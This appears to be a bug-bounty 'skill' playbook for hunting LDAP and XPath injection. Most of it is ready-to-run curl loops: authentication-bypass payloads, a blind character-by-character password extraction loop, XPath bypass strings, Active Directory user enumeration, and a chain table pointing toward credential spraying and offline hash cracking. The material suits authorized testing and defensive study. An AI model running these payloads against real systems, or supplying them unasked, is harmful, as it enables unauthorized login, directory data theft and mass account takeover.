---
name: hunt-ldap
description: Hunt LDAP Injection and XPath Injection — authentication bypass, data exfiltration from Active Directory, directory traversal, AD user/group enumeration. Use when target uses LDAP/AD authentication, corporate SSO with directory backend, or XML-based data stores with XPath queries.
sources: hackerone_public
report_count: 8
---

# HUNT-LDAP — LDAP Injection & XPath Injection

## Crown Jewel Targets

LDAP injection bypassing authentication = Critical. AD data exfiltration = High.

**Highest-value chains:**
- **LDAP auth bypass** — `admin)(|(password=*)` breaks LDAP filter → login without password
- **AD user enumeration** — wildcard LDAP queries enumerate all Active Directory users, emails, groups
- **XPath injection auth bypass** — `' or '1'='1` in XPath query → bypass XML-based auth
- **LDAP blind exfil** — char-by-char attribute extraction via boolean response differences

---

## Attack Surface Signals

```
Corporate SSO login pages
Active Directory integrated authentication
Windows environments (IIS + AD)
/api/ldap/* , /api/directory/*
XML-based config files or data stores
/api/search with corporate directory integration
Error messages: javax.naming.*, LDAP Error Code 49, LDAPException
```

---

## Step-by-Step Hunting Methodology

### Phase 1 — Detect LDAP Backend
```bash
# Inject wildcard in username — LDAP wildcard matches any value
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "*", "password": "*"}' | \
  grep -i "invalid\|error\|ldap\|directory"

# Look for LDAP error messages:
# javax.naming.NameNotFoundException
# LDAP Error Code 49
# LDAPException: Invalid DN Syntax
# com.sun.jndi.ldap

# Try invalid LDAP chars to trigger errors
curl -s -X POST https://$TARGET/api/login \
  -d "username=test)(&(uid=*)&password=test" | \
  grep -i "error\|exception\|ldap"
```

### Phase 2 — LDAP Auth Bypass Payloads
```bash
# Normal LDAP filter: (&(uid=USERNAME)(password=PASSWORD))
# Injection breaks the filter to always return true

USERNAME_PAYLOADS=(
  "admin)(&"
  "*)(uid=*))(|(uid=*"
  "admin)(|(uid=*)"
  "*)(&"
  "admin)%00"
)

for PAYLOAD in "${USERNAME_PAYLOADS[@]}"; do
  RESP=$(curl -s -X POST https://$TARGET/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\": \"$PAYLOAD\", \"password\": \"anything\"}" | head -c 200)
  echo "PAYLOAD: $PAYLOAD"
  echo "RESPONSE: $RESP"
  echo "---"
done
```

### Phase 3 — LDAP Blind Data Exfiltration
```bash
# Blind injection: enumerate first char of admin password
# Different response length/behavior when char matches

for CHAR in a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9; do
  LEN=$(curl -s -o /dev/null -w "%{size_download}" \
    -X POST https://$TARGET/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\": \"admin)(password=$CHAR*))(&(uid=x\", \"password\": \"x\"}")
  echo "$CHAR: $LEN bytes"
done
# Char with different byte count = match
```

### Phase 4 — XPath Injection
```bash
# XPath is used in XML-based auth systems
# Normal: //users/user[name/text()='ADMIN' and password/text()='PASS']
# Bypass: ' or '1'='1

XPATH_PAYLOADS=(
  "' or '1'='1"
  "' or 1=1 or 'x'='y"
  "x' or name()='username' or 'x'='y"
  "admin' or '1'='1"
  "' or ''='"
)

for PAYLOAD in "${XPATH_PAYLOADS[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")
  RESP=$(curl -s -X POST https://$TARGET/api/login \
    -d "username=$ENCODED&password=test" | head -c 200)
  echo "$PAYLOAD → $RESP"
  echo "---"
done
```

### Phase 5 — Active Directory Enumeration
```bash
# Wildcard enumeration — does 'a*' match AD users starting with 'a'?
for LETTER in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  RESP=$(curl -s https://$TARGET/api/search \
    -H "Content-Type: application/json" \
    -d "{\"query\": \"$LETTER*\"}")
  COUNT=$(echo "$RESP" | python3 -c \
    "import sys,json; d=json.load(sys.stdin); print(len(d.get('users',[])))" 2>/dev/null)
  echo "Prefix '$LETTER': ${COUNT:-unknown} results"
done
```

### Phase 6 — LDAP Attribute Extraction
```bash
# Extract user attributes via filter injection
# Test: does (mail=admin@target.com) return different response than (mail=x)?
curl -s -X POST https://$TARGET/api/directory/search \
  -H "Content-Type: application/json" \
  -d '{"filter": "(mail=admin@target.com)"}' | head -5

curl -s -X POST https://$TARGET/api/directory/search \
  -H "Content-Type: application/json" \
  -d '{"filter": "(|(mail=*)(uid=*))"}' | head -5
```

---

## Chain Table

| LDAP finding | Chain to | Impact |
|-------------|----------|--------|
| Auth bypass | Admin panel access | Full admin control |
| AD user enumeration | Username list → credential spray | Mass ATO risk |
| Group membership exfil | Identify admin accounts | Targeted attacks |
| Blind LDAP confirmed | Extract password hashes (if stored in LDAP) | Offline crack |

---

## Validation

✅ Auth bypass: logged in without correct credentials via LDAP injection
✅ AD enumeration: able to list users/groups from directory
✅ XPath bypass: authentication succeeded with `' or '1'='1` payload

**Severity:**
- Auth bypass as admin: Critical
- AD user/group enumeration: Medium-High
- Blind LDAP confirmed, no useful exfil: Medium
